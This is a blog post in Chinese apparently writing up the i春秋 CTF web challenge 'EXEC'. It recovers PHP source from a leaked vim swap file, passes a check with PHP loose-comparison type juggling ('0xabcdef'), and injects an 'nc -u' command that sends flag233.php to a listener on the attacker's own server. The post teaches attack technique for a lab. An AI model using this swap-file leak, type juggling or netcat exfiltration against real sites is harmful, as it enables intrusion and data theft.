{"title":"i春秋-Web-EXEC","date":"2018-09-11T08:35:23.000Z","slug":"ichunqiu-web-EXEC","tags":["Web","i春秋"],"updated":"2018-09-11T08:35:28.230Z","content":"<p>根据提示，是一道命令执行的题。</p>\n<p>打开以后，提示 <code>no sign</code> ，未登录。</p>\n<p>查看源码，看到 <code>meta</code> 信息里有提示，使用了 <code>vim</code>。猜测可能存在 <code>swp</code> 文件泄露。</p>\n<p>直接访问 <code>.index.php.swp</code> ，成功下载。</p>\n<p>使用命令 <code>vim -r .index.php.swp</code> ，恢复文件，获得以下内容。</p>\n<p>整理内容，得到以下代码。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;blind cmd exec&lt;/title&gt;</span><br><span class=\"line\">&lt;meta language=<span class=\"string\">'utf-8'</span> editor=<span class=\"string\">'vim'</span>&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;img src=pic.gif&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">flag in flag233.php</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span><span class=\"params\">($number)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        $one = ord(<span class=\"string\">'1'</span>);</span><br><span class=\"line\">        $nine = ord(<span class=\"string\">'9'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; strlen($number); $i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                $digit = ord($number&#123;$i&#125;);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">           <span class=\"keyword\">return</span> $number == <span class=\"string\">'11259375'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class=\"line\">        setcookie(<span class=\"string\">'auth'</span>,<span class=\"string\">'tcp tunnel is forbidden!'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'cmd'</span>]))&#123;</span><br><span class=\"line\">                $command=$_POST[cmd];</span><br></pre></td></tr></table></figure>\n<p>分析代码，知道需要通过 <code>GET</code> 传入一个 <code>sign</code>参数 ，必须和 <code>11259375</code> 相等，同时参数的每个字符都不能在 <code>1-9</code>之间。</p>\n<p>这里用的是 <code>==</code> ，所以可以传入 <code>0xabcdef</code> 绕过。</p>\n<p>通过外层 <code>if</code> 后，提示 <code>tcp 通道不能使用</code>，然后会执行 <code>cmd</code> 参数的命令。</p>\n<p>这里需要一台服务器监听一个 <code>udp</code> 端口，可以用 <code>nc</code> 实现，</p>\n<blockquote>\n<p>nc -ul 8989</p>\n</blockquote>\n<div class=\"article-img\"><p><img src=\"/post/ichunqiu-web-EXEC/bp.png\" alt=\"bp\"></p></div>\n<p>传入 <code>cmd=nc -u 服务器地址 端口 &lt; flag233.php</code>，服务器就能接收到 <code>flag233.php</code> 的内容。</p>\n<div class=\"article-img\"><p><img src=\"/post/ichunqiu-web-EXEC/flag.png\" alt=\"flag\"></p></div>\n","prev":{"title":"ichunqiu-web-Upload","slug":"ichunqiu-web-Upload"},"next":{"title":"i春秋-Web-SQLi","slug":"ichunqiu-web-SQLi"},"link":"http://Jayl1n.github.io/post/ichunqiu-web-EXEC/"}